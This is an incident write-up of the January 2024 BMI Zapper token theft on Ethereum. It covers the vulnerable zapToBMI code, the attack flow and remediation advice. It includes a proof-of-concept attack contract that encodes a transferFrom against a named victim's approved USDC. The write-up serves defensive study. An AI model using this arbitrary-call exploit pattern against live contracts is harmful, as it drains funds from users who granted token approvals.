# BMI Zapper — Arbitrary External Call Token Theft Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-23 |
| **Protocol** | BMI Zapper |
| **Chain** | Ethereum |
| **Loss** | ~$114,000 (114,000 USDC) |
| **Attacker** | [0x63136677](https://etherscan.io/address/0x63136677355840f26c0695dd6de5c9e4f514f8e8) |
| **Attack Contract** | [0xae5919160](https://etherscan.io/address/0xae5919160a646f5d80d89f7aae35a2ca74738440) |
| **Vulnerable Contract** | [BMIZapper 0x4622aff8](https://etherscan.io/address/0x4622aff8e521a444c9301da0efd05f6b482221b8) |
| **Root Cause** | `zapToBMI()` makes an external call with aggregator address and calldata without validation, allowing theft of tokens approved by victims |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/Bmizapper_exp.sol) |

---

## 1. Vulnerability Overview

The `zapToBMI()` function of the BMI Zapper contract directly makes an external call using a user-supplied aggregator address and calldata. The attacker specified the USDC contract as the aggregator address and encoded `transferFrom(victim, attacker, balance)` as the calldata, stealing 114,000 USDC from a victim (0x07d768...) who had approved BMIZapper to spend their USDC.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: allows arbitrary calldata to be passed to arbitrary address
function zapToBMI(
    address aggregator,       // attacker sets this to USDC address
    bytes calldata swapData,  // attacker encodes transferFrom here
    BMIConstituent[] calldata bmiConstituents,
    uint256 minBMIOut
) external {
    // no validation of aggregator address
    (bool success,) = aggregator.call(swapData);
    require(success, "swap failed");
}

// ✅ Safe code: only whitelisted aggregators allowed
mapping(address => bool) public approvedAggregators;

function zapToBMI(
    address aggregator,
    bytes calldata swapData,
    BMIConstituent[] calldata bmiConstituents,
    uint256 minBMIOut
) external {
    require(approvedAggregators[aggregator], "unapproved aggregator");
    (bool success,) = aggregator.call(swapData);
    require(success, "swap failed");
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: BMIZapper.sol
    function zapToBMI(  // ❌ vulnerability
        address _from,
        uint256 _amount,
        address _fromUnderlying,
        uint256 _fromUnderlyingAmount,
        uint256 _minBMIRecv,
        address[] memory _bmiConstituents,
        uint256[] memory _bmiConstituentsWeightings,
        address _aggregator,
        bytes memory _aggregatorData,
        bool refundDust
    ) public returns (uint256) {
        uint256 sum = 0;
        for (uint256 i = 0; i < _bmiConstituentsWeightings.length; i++) {
            sum = sum.add(_bmiConstituentsWeightings[i]);
        }

        // Sum should be between 0.999 and 1.000
        assert(sum <= 1e18);
        assert(sum >= 999e15);

        // Transfer to contract
        IERC20(_from).safeTransferFrom(msg.sender, address(this), _amount);

        // Primitive
        if (_isBare(_from)) {
            _primitiveToBMI(_from, _amount, _bmiConstituents, _bmiConstituentsWeightings, _aggregator, _aggregatorData);
        }
        // Yearn (primitive)
        else if (_isYearn(_from)) {
            IYearn(_from).withdraw();
            _primitiveToBMI(
                _fromUnderlying,
                _fromUnderlyingAmount,
                _bmiConstituents,
                _bmiConstituentsWeightings,
                _aggregator,
                _aggregatorData
            );
        }
        // Yearn (primitive)
        else if (_isYearnCRV(_from)) {
            IYearn(_from).withdraw();
            address crvToken = IYearn(_from).token();
            _crvToPrimitive(crvToken, IERC20(crvToken).balanceOf(address(this)));
            _primitiveToBMI(
                USDC,
                IERC20(USDC).balanceOf(address(this)),
                _bmiConstituents,
                _bmiConstituentsWeightings,
                address(0),
                ""
            );
        }
        // Compound
        else if (_isCompound(_from)) {
            require(ICToken(_from).redeem(_amount) == 0, "!ctoken-redeem");
            _primitiveToBMI(
                _fromUnderlying,
                _fromUnderlyingAmount,
                _bmiConstituents,
                _bmiConstituentsWeightings,
                _aggregator,
                _aggregatorData
            );
        }
        // Aave
        else if (_isAave(_from)) {
            IERC20(_from).safeApprove(AAVE_LENDING_POOL_V2, 0);
            IERC20(_from).safeApprove(AAVE_LENDING_POOL_V2, _amount);
            ILendingPoolV2(AAVE_LENDING_POOL_V2).withdraw(_fromUnderlying, type(uint256).max, address(this));

            _primitiveToBMI(
                _fromUnderlying,
                _fromUnderlyingAmount,
                _bmiConstituents,
                _bmiConstituentsWeightings,
                _aggregator,
                _aggregatorData
            );
        }
        // Curve
        else {
            _crvToPrimitive(_from, _amount);
            _primitiveToBMI(
                USDC,
                IERC20(USDC).balanceOf(address(this)),
                _bmiConstituents,
                _bmiConstituentsWeightings,
                address(0),
                ""
            );
        }

        // Checks
        uint256 _bmiBal = IERC20(BMI).balanceOf(address(this));
        require(_bmiBal >= _minBMIRecv, "!min-mint");
        IERC20(BMI).safeTransfer(msg.sender, _bmiBal);

        // Convert back dust to USDC and refund remaining USDC to usd
        if (refundDust) {
            for (uint256 i = 0; i < _bmiConstituents.length; i++) {
                _fromBMIConstituentToUSDC(_bmiConstituents[i], IERC20(_bmiConstituents[i]).balanceOf(address(this)));
            }
            IERC20(USDC).safeTransfer(msg.sender, IERC20(USDC).balanceOf(address(this)));
        }

        return _bmiBal;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Query victim (0x07d768) USDC balance
  │       └─ 114,000 USDC approved to BMIZapper
  │
  ├─→ [2] Construct malicious calldata:
  │       └─ encode transferFrom(victim, attacker, 114000 USDC)
  │
  ├─→ [3] Call zapToBMI(
  │       aggregator = USDC contract,
  │       swapData = malicious transferFrom calldata
  │   )
  │
  └─→ [4] transferFrom executed on USDC contract
          └─ victim → attacker: 114,000 USDC transferred
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBMIZapper {
    struct BMIConstituent { address token; uint256 ratio; }
    function zapToBMI(
        address aggregator,
        bytes calldata swapData,
        BMIConstituent[] calldata bmiConstituents,
        uint256 minBMIOut
    ) external;
}

contract AttackContract {
    IBMIZapper constant zapper = IBMIZapper(0x4622aff8e521a444c9301da0efd05f6b482221b8);
    IERC20    constant USDC   = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address   constant victim = 0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d;

    function testExploit() external {
        // [1] Check victim balance
        uint256 victimBalance = USDC.balanceOf(victim);

        // [2] Encode malicious transferFrom calldata
        bytes memory maliciousData = abi.encodeWithSelector(
            USDC.transferFrom.selector,
            victim,
            address(this),
            victimBalance
        );

        // [3] Call zapToBMI — aggregator = USDC address
        IBMIZapper.BMIConstituent[] memory empty;
        zapper.zapToBMI(
            address(USDC),  // Disguise USDC contract as aggregator
            maliciousData,  // Execute transferFrom
            empty,
            0
        );
        // Victim's USDC successfully transferred to attacker
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Arbitrary External Call |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (abuse of token approvals) |
| **DApp Category** | DEX Aggregator / Zapper |
| **Impact** | Theft of tokens approved by users |

## 6. Remediation Recommendations

1. **Aggregator Whitelist**: Manage approved aggregator addresses via a mapping so only whitelisted addresses can receive external calls
2. **Calldata Validation**: Block calls when dangerous selectors such as `transferFrom` or `transfer` are present in the calldata
3. **Asset Token Prohibition**: Validate that ERC20 token contract addresses cannot be used as the aggregator
4. **Principle of Least Privilege**: Guide UX so that users approve only the exact amount needed rather than indefinite max approvals

## 7. Lessons Learned

- Swap functionality that passes calldata directly through external aggregators is inherently exposed to arbitrary call vulnerabilities.
- The harm falls not on the attacker's account but on ordinary users who have approved tokens to the Zapper.
- The same vulnerability pattern recurred across multiple protocols in early 2024, including Socket Gateway and Paraswap.